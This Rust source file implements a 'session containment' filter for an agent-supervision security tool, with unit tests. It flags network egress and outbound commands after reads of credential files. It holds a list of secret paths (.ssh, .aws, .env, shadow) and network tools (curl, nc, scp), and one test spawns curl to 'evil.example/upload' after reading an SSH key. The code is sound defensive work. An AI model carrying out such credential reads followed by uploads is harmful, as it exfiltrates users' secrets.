// SPDX-License-Identifier: MPL-2.0
// Copyright (c) grith contributors

//! Session containment filter restricting tainted session egress.

use crate::filters::{FilterPhase, SecurityFilter};
use crate::scoring::severity_for;
use crate::types::{FilterResult, TaintLevel, ToolCallContext, ToolCallType};
use serde::Deserialize;
use std::collections::HashMap;
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};
use uuid::Uuid;

#[derive(Debug, Clone, Deserialize)]
#[serde(default)]
pub struct SessionContainmentConfig {
    pub enabled: bool,
    pub containment_window_seconds: u64,
    pub sensitive_sources: Vec<String>,
    pub outbound_command_tokens: Vec<String>,
    pub network_score: f64,
    pub process_score: f64,
    pub shell_score: f64,
}

impl Default for SessionContainmentConfig {
    fn default() -> Self {
        Self {
            enabled: true,
            containment_window_seconds: 600,
            sensitive_sources: vec![
                ".env".into(),
                ".ssh".into(),
                ".aws".into(),
                ".gnupg".into(),
                ".kube/config".into(),
                "id_rsa".into(),
                "id_ed25519".into(),
                "credentials".into(),
                "secrets".into(),
                "passwd".into(),
                "shadow".into(),
                "keychain".into(),
            ],
            outbound_command_tokens: vec![
                "curl ".into(),
                "wget ".into(),
                "nc ".into(),
                "netcat ".into(),
                "scp ".into(),
                "ftp ".into(),
                "sftp ".into(),
                "nslookup ".into(),
                " dig ".into(),
            ],
            network_score: 4.5,
            process_score: 4.0,
            shell_score: 3.5,
        }
    }
}

/// Shared containment state tracker. Thread-safe and shareable via `Arc`.
///
/// This is the authoritative source of containment state for all sessions.
/// Both the `SessionContainmentFilter` (which writes to it) and external
/// consumers like the CLI summary and dashboard API (which read from it)
/// share the same instance.
pub struct ContainmentTracker {
    contained_sessions: Mutex<HashMap<Uuid, Instant>>,
    containment_window: Duration,
}

impl ContainmentTracker {
    /// Create a tracker with the given containment window.
    pub fn new(window: Duration) -> Self {
        Self {
            contained_sessions: Mutex::new(HashMap::new()),
            containment_window: window,
        }
    }

    /// Create a tracker with the default 600-second window.
    pub fn with_defaults() -> Self {
        Self::new(Duration::from_secs(600))
    }

    /// Arm containment for a session.
    pub fn register(&self, session_id: Uuid, now: Instant) {
        let mut sessions = self.contained_sessions.lock().expect("lock poisoned");
        sessions.insert(session_id, now);
    }

    /// Explicitly lift containment for a session.
    /// Returns `true` when the session was contained and removed.
    pub fn unregister(&self, session_id: Uuid) -> bool {
        let mut sessions = self.contained_sessions.lock().expect("lock poisoned");
        sessions.remove(&session_id).is_some()
    }

    /// Returns remaining containment seconds for the given session, or `None`
    /// if the session is not contained (or containment has expired).
    pub fn active_remaining_seconds(&self, session_id: Uuid, now: Instant) -> Option<u64> {
        let mut sessions = self.contained_sessions.lock().expect("lock poisoned");
        let armed_at = sessions.get(&session_id).copied()?;
        let elapsed = now.saturating_duration_since(armed_at);
        if elapsed > self.containment_window {
            sessions.remove(&session_id);
            return None;
        }
        Some((self.containment_window - elapsed).as_secs())
    }

    /// Query remaining containment seconds using the current instant.
    pub fn remaining_seconds(&self, session_id: Uuid) -> Option<u64> {
        self.active_remaining_seconds(session_id, Instant::now())
    }

    /// Return all currently contained sessions with their remaining seconds.
    pub fn list_active(&self) -> Vec<(Uuid, u64)> {
        let now = Instant::now();
        let mut sessions = self.contained_sessions.lock().expect("lock poisoned");
        let mut expired = Vec::new();
        let mut active = Vec::new();
        for (&id, &armed_at) in sessions.iter() {
            let elapsed = now.saturating_duration_since(armed_at);
            if elapsed > self.containment_window {
                expired.push(id);
            } else {
                active.push((id, (self.containment_window - elapsed).as_secs()));
            }
        }
        for id in expired {
            sessions.remove(&id);
        }
        active
    }
}

pub struct SessionContainmentFilter {
    sensitive_sources: Vec<String>,
    outbound_command_tokens: Vec<String>,
    network_score: f64,
    process_score: f64,
    shell_score: f64,
    tracker: Arc<ContainmentTracker>,
}

impl SessionContainmentFilter {
    pub fn from_config(config: SessionContainmentConfig) -> (Self, Arc<ContainmentTracker>) {
        let tracker = Arc::new(ContainmentTracker::new(Duration::from_secs(
            config.containment_window_seconds,
        )));
        let filter = Self {
            sensitive_sources: normalize(config.sensitive_sources),
            outbound_command_tokens: normalize(config.outbound_command_tokens),
            network_score: config.network_score,
            process_score: config.process_score,
            shell_score: config.shell_score,
            tracker: Arc::clone(&tracker),
        };
        (filter, tracker)
    }

    pub fn with_defaults() -> (Self, Arc<ContainmentTracker>) {
        Self::from_config(SessionContainmentConfig::default())
    }

    /// Get a shared reference to the containment tracker.
    pub fn tracker(&self) -> Arc<ContainmentTracker> {
        Arc::clone(&self.tracker)
    }

    fn is_sensitive_source(&self, path: &str) -> bool {
        let lowered = path.to_lowercase();
        let basename = lowered.rsplit('/').next().unwrap_or("");
        // Match on path SEGMENTS / basename, NOT arbitrary substrings. A bare
        // `contains` armed containment on any path that merely embedded a token
        // — e.g. the source file `secret_scan.rs` (matched "secrets" loosely),
        // a dep dir like `sample-1.2` (matched "sam"), or any path containing
        // "credentials". Supervising a build of a security-tooling tree (grith
        // itself) thus armed containment on a routine read, after which every
        // ProcessSpawn scored +process_score for the whole window and flooded
        // prompts. A needle now matches only when:
        //   - it contains '/' (e.g. ".kube/config"): a path suffix on a '/'
        //     boundary;
        //   - it equals a path segment (sensitive dirs like `.ssh`/`.aws`, and
        //     sensitive basenames like `id_rsa`/`credentials`); or
        //   - it is a dotfile prefix of the basename (`.env` -> `.env.local`).
        // Basename stem = the part before the first '.', so `secrets.yaml` /
        // `credentials.json` match (stem "secrets" / "credentials") but
        // `secret_scan.rs` / `credentials_helper.rs` do not (stems
        // "secret_scan" / "credentials_helper").
        let stem = basename.split('.').next().unwrap_or(basename);
        self.sensitive_sources.iter().any(|needle| {
            if needle.contains('/') {
                // Multi-component (e.g. ".kube/config"): path suffix on a '/'.
                lowered == *needle || lowered.ends_with(&format!("/{needle}"))
            } else if needle.starts_with('.') {
                // Dotfile dir/file (.ssh, .aws, .env): segment match, or a
                // basename variant (`.env` -> `.env.local`).
                lowered.split('/').any(|seg| seg == needle.as_str())
                    || basename.starts_with(needle.as_str())
            } else {
                // Plain token: a full path segment (sensitive dir like
                // `secrets/`, or extensionless secret file like `credentials`)
                // OR the basename stem.
                lowered.split('/').any(|seg| seg == needle.as_str()) || stem == needle.as_str()
            }
        })
    }

    fn looks_outbound_command(&self, command: &str) -> bool {
        let lowered = command.to_lowercase();
        self.outbound_command_tokens
            .iter()
            .any(|needle| lowered.contains(needle))
    }

    /// Whether a `ProcessSpawn` can move data off the machine, and is therefore
    /// worth containment scrutiny. Containment exists to catch *exfil*, not to
    /// block routine local execution — penalising every spawn flooded the
    /// operator with prompts when a contained session ran a build (hundreds of
    /// `rustc`/`ld.mold`/test-binary spawns, none of which can leave the host).
    /// Mirrors the existing `ShellExec` gating (outbound-only).
    ///
    /// Prefers the supervisor-computed `SpawnProvenance.is_outbound_capable`
    /// (PR 2's curated registry applied to the canonical path). On the LLM path,
    /// where provenance isn't attached, falls back to the same outbound-token
    /// heuristic used for shell commands.
    fn spawn_is_outbound_capable(&self, ctx: &ToolCallContext) -> bool {
        if let Some(prov) = &ctx.spawn_provenance {
            return prov.is_outbound_capable;
        }
        ctx.full_command()
            .is_some_and(|cmd| self.looks_outbound_command(&cmd))
    }

    fn evaluate_at(
        &self,
        ctx: &ToolCallContext,
        now: Instant,
    ) -> crate::error::Result<FilterResult> {
        if let ToolCallType::FileRead { path } = &ctx.call_type {
            if self.is_sensitive_source(path) {
                self.tracker.register(ctx.session_id, now);
                return Ok(FilterResult::no_match("session_containment"));
            }
        }

        if ctx.source_taint != TaintLevel::None {
            self.tracker.register(ctx.session_id, now);
        }

        let Some(remaining) = self.tracker.active_remaining_seconds(ctx.session_id, now) else {
            return Ok(FilterResult::no_match("session_containment"));
        };

        let mk_message = |kind: &str| {
            format!("Session containment active ({remaining}s remaining): {kind} requires review")
        };

        let result = match &ctx.call_type {
            ToolCallType::HttpRequest { .. } | ToolCallType::NetConnect { .. } => {
                let severity = severity_for(self.network_score);
                FilterResult::matched(
                    "session_containment",
                    "contained-network-egress",
                    self.network_score,
                    severity,
                    mk_message("network egress"),
                )
            }
            ToolCallType::ProcessSpawn { .. } if self.spawn_is_outbound_capable(ctx) => {
                let severity = severity_for(self.process_score);
                FilterResult::matched(
                    "session_containment",
                    "contained-process-egress",
                    self.process_score,
                    severity,
                    mk_message("outbound-capable process spawn"),
                )
            }
            // Routine local spawn (compiler, linker, test binary, …) under
            // containment: it cannot exfil, so don't penalise it. This is the
            // fix for the prompt flood when a contained session runs a build.
            ToolCallType::ProcessSpawn { .. } => FilterResult::no_match("session_containment"),
            ToolCallType::ShellExec { .. } => match ctx.full_command() {
                Some(full) if self.looks_outbound_command(&full) => {
                    let severity = severity_for(self.shell_score);
                    FilterResult::matched(
                        "session_containment",
                        "contained-shell-egress",
                        self.shell_score,
                        severity,
                        mk_message("shell outbound operation"),
                    )
                }
                _ => FilterResult::no_match("session_containment"),
            },
            _ => FilterResult::no_match("session_containment"),
        };

        Ok(result)
    }
}

#[async_trait::async_trait]
impl SecurityFilter for SessionContainmentFilter {
    fn name(&self) -> &str {
        "session_containment"
    }

    fn phase(&self) -> FilterPhase {
        FilterPhase::Context
    }

    async fn evaluate(&self, ctx: &ToolCallContext) -> crate::error::Result<FilterResult> {
        self.evaluate_at(ctx, Instant::now())
    }
}

fn normalize(values: Vec<String>) -> Vec<String> {
    values
        .into_iter()
        .map(|v| v.trim().to_lowercase())
        .filter(|v| !v.is_empty())
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn make_ctx(session_id: Uuid, call_type: ToolCallType) -> ToolCallContext {
        ToolCallContext::new("test", call_type, session_id)
    }

    #[test]
    fn is_sensitive_source_matches_real_secrets_not_embedded_tokens() {
        let (filter, _t) = SessionContainmentFilter::with_defaults();
        // Real secret locations → must arm containment.
        for p in [
            "/home/u/.ssh/id_rsa",
            "/home/u/.aws/credentials",
            "/home/u/project/.env",
            "/home/u/project/.env.local",
            "/home/u/.kube/config",
            "/home/u/.gnupg/secring.gpg",
            "/etc/shadow",
            "/home/u/app/secrets.yaml",     // stem "secrets"
            "/home/u/app/credentials.json", // stem "credentials"
            "/home/u/k8s/secrets/db",       // "secrets" dir segment
        ] {
            assert!(filter.is_sensitive_source(p), "should arm on {p}");
        }
        // Paths that merely EMBED a token (the flood source) → must NOT arm.
        for p in [
            "/home/u/grith/crates/grith-proxy/src/filters/secret_scan.rs",
            "/home/u/grith/crates/grith-core/src/credentials_helper.rs",
            "/home/u/.cargo/registry/src/idx/sample-1.2.0/src/lib.rs",
            "/home/u/grith/target/debug/deps/sign_profiles-90c7a42aee726d3d",
            "/home/u/grith/docs/secrets-design.md",
        ] {
            assert!(!filter.is_sensitive_source(p), "must NOT arm on {p}");
        }
    }

    fn provenance(is_outbound_capable: bool) -> crate::types::SpawnProvenance {
        crate::types::SpawnProvenance {
            canonical_path: "/x".into(),
            sha256: String::new(),
            owner_uid: 0,
            owner_gid: 0,
            mode: 0,
            component_writability: vec![],
            matched_routine_root: None,
            is_outbound_capable,
        }
    }

    // Arm containment, then assert ProcessSpawn is penalised ONLY when the
    // spawn is outbound-capable — the fix for the build-spawn prompt flood.
    #[tokio::test]
    async fn contained_process_spawn_penalised_only_when_outbound() {
        let (filter, _t) = SessionContainmentFilter::with_defaults();
        let sid = Uuid::new_v4();
        let now = Instant::now();
        // Arm via a real sensitive read.
        let _ = filter
            .evaluate_at(
                &make_ctx(
                    sid,
                    ToolCallType::FileRead {
                        path: "/home/u/.ssh/id_rsa".into(),
                    },
                ),
                now,
            )
            .unwrap();
        let later = now + Duration::from_secs(1);

        // (1) Routine local spawn, no provenance, no outbound token → exempt.
        let routine = make_ctx(
            sid,
            ToolCallType::ProcessSpawn {
                command: "/home/u/grith/target/debug/deps/sign_profiles-90c7".into(),
                args: vec![],
            },
        );
        assert!(
            !filter.evaluate_at(&routine, later).unwrap().matched,
            "routine local spawn must NOT be contained"
        );

        // (2) Outbound spawn via fallback token (no provenance) → contained.
        let curl = make_ctx(
            sid,
            ToolCallType::ProcessSpawn {
                command: "curl".into(),
                args: vec!["https://evil.example/upload".into()],
            },
        );
        assert!(
            filter.evaluate_at(&curl, later).unwrap().matched,
            "outbound spawn must be contained"
        );

        // (3) Provenance flag is authoritative: not-outbound → exempt even for
        // a scary-looking path; outbound → contained.
        let mut prov_routine = make_ctx(
            sid,
            ToolCallType::ProcessSpawn {
                command: "/usr/bin/rustc".into(),
                args: vec![],
            },
        );
        prov_routine.spawn_provenance = Some(provenance(false));
        assert!(!filter.evaluate_at(&prov_routine, later).unwrap().matched);

        let mut prov_outbound = make_ctx(
            sid,
            ToolCallType::ProcessSpawn {
                command: "/usr/bin/curl".into(),
                args: vec![],
            },
        );
        prov_outbound.spawn_provenance = Some(provenance(true));
        assert!(filter.evaluate_at(&prov_outbound, later).unwrap().matched);
    }

    #[tokio::test]
    async fn test_sensitive_read_arms_network_containment() {
        let (filter, _tracker) = SessionContainmentFilter::with_defaults();
        let session_id = Uuid::new_v4();
        let now = Instant::now();

        let read_ctx = make_ctx(
            session_id,
            ToolCallType::FileRead {
                path: ".env".into(),
            },
        );
        let read_result = filter.evaluate_at(&read_ctx, now).unwrap();
        assert!(!read_result.matched);

        let net_ctx = make_ctx(
            session_id,
            ToolCallType::HttpRequest {
                method: "POST".into(),
                url: "https://example.com/upload".into(),
            },
        );
        let net_result = filter
            .evaluate_at(&net_ctx, now + Duration::from_secs(1))
            .unwrap();
        assert!(net_result.matched);
        assert_eq!(net_result.rule_id, "contained-network-egress");
    }

    #[tokio::test]
    async fn test_containment_expires_after_window() {
        let cfg = SessionContainmentConfig {
            containment_window_seconds: 2,
            ..SessionContainmentConfig::default()
        };
        let (filter, _tracker) = SessionContainmentFilter::from_config(cfg);
        let session_id = Uuid::new_v4();
        let now = Instant::now();

        let read_ctx = make_ctx(
            session_id,
            ToolCallType::FileRead {
                path: ".env".into(),
            },
        );
        let _ = filter.evaluate_at(&read_ctx, now).unwrap();

        let net_ctx = make_ctx(
            session_id,
            ToolCallType::NetConnect {
                address: "203.0.113.20".into(),
                port: 443,
            },
        );
        let result = filter
            .evaluate_at(&net_ctx, now + Duration::from_secs(3))
            .unwrap();
        assert!(!result.matched);
    }

    #[tokio::test]
    async fn test_containment_is_session_scoped() {
        let (filter, _tracker) = SessionContainmentFilter::with_defaults();
        let sensitive_session = Uuid::new_v4();
        let safe_session = Uuid::new_v4();
        let now = Instant::now();

        let read_ctx = make_ctx(
            sensitive_session,
            ToolCallType::FileRead {
                path: "~/.ssh/id_rsa".into(),
            },
        );
        let _ = filter.evaluate_at(&read_ctx, now).unwrap();

        let other_ctx = make_ctx(
            safe_session,
            ToolCallType::HttpRequest {
                method: "POST".into(),
                url: "https://example.com".into(),
            },
        );
        let result = filter
            .evaluate_at(&other_ctx, now + Duration::from_secs(1))
            .unwrap();
        assert!(!result.matched);
    }

    #[tokio::test]
    async fn test_shell_outbound_command_is_contained() {
        let (filter, _tracker) = SessionContainmentFilter::with_defaults();
        let session_id = Uuid::new_v4();
        let now = Instant::now();

        let read_ctx = make_ctx(
            session_id,
            ToolCallType::FileRead {
                path: "secrets.yaml".into(),
            },
        );
        let _ = filter.evaluate_at(&read_ctx, now).unwrap();

        let shell_ctx = make_ctx(
            session_id,
            ToolCallType::ShellExec {
                command: "curl".into(),
                args: vec!["https://example.com/upload".into()],
            },
        );
        let result = filter
            .evaluate_at(&shell_ctx, now + Duration::from_secs(1))
            .unwrap();
        assert!(result.matched);
        assert_eq!(result.rule_id, "contained-shell-egress");
    }

    #[tokio::test]
    async fn test_non_outbound_shell_not_matched() {
        let (filter, _tracker) = SessionContainmentFilter::with_defaults();
        let session_id = Uuid::new_v4();
        let now = Instant::now();

        let read_ctx = make_ctx(
            session_id,
            ToolCallType::FileRead {
                path: "credentials.json".into(),
            },
        );
        let _ = filter.evaluate_at(&read_ctx, now).unwrap();

        let shell_ctx = make_ctx(
            session_id,
            ToolCallType::ShellExec {
                command: "ls".into(),
                args: vec!["-la".into()],
            },
        );
        let result = filter
            .evaluate_at(&shell_ctx, now + Duration::from_secs(1))
            .unwrap();
        assert!(!result.matched);
    }

    #[test]
    fn test_tracker_list_active() {
        let tracker = ContainmentTracker::new(Duration::from_secs(60));
        let now = Instant::now();
        let s1 = Uuid::new_v4();
        let s2 = Uuid::new_v4();

        tracker.register(s1, now);
        tracker.register(s2, now);

        let active = tracker.list_active();
        assert_eq!(active.len(), 2);
        assert!(active.iter().any(|(id, _)| *id == s1));
        assert!(active.iter().any(|(id, _)| *id == s2));
    }

    #[test]
    fn test_tracker_remaining_seconds() {
        let tracker = ContainmentTracker::new(Duration::from_secs(10));
        let now = Instant::now();
        let session_id = Uuid::new_v4();

        assert!(tracker.active_remaining_seconds(session_id, now).is_none());

        tracker.register(session_id, now);
        let remaining = tracker.active_remaining_seconds(session_id, now).unwrap();
        assert_eq!(remaining, 10);

        // After window expires
        let expired = tracker.active_remaining_seconds(session_id, now + Duration::from_secs(11));
        assert!(expired.is_none());
    }

    #[test]
    fn test_tracker_unregister_lifts_containment() {
        let tracker = ContainmentTracker::new(Duration::from_secs(60));
        let session_id = Uuid::new_v4();
        tracker.register(session_id, Instant::now());
        assert!(tracker.remaining_seconds(session_id).is_some());
        assert!(tracker.unregister(session_id));
        assert!(tracker.remaining_seconds(session_id).is_none());
        assert!(!tracker.unregister(session_id));
    }

    #[tokio::test]
    async fn test_tracker_shared_between_filter_and_external() {
        let (filter, tracker) = SessionContainmentFilter::with_defaults();
        let session_id = Uuid::new_v4();
        let now = Instant::now();

        // No containment initially
        assert!(tracker.remaining_seconds(session_id).is_none());

        // Trigger containment via the filter
        let read_ctx = make_ctx(
            session_id,
            ToolCallType::FileRead {
                path: ".env".into(),
            },
        );
        let _ = filter.evaluate_at(&read_ctx, now).unwrap();

        // Tracker now sees the containment
        let remaining = tracker.active_remaining_seconds(session_id, now).unwrap();
        assert!(remaining > 0);
    }
}
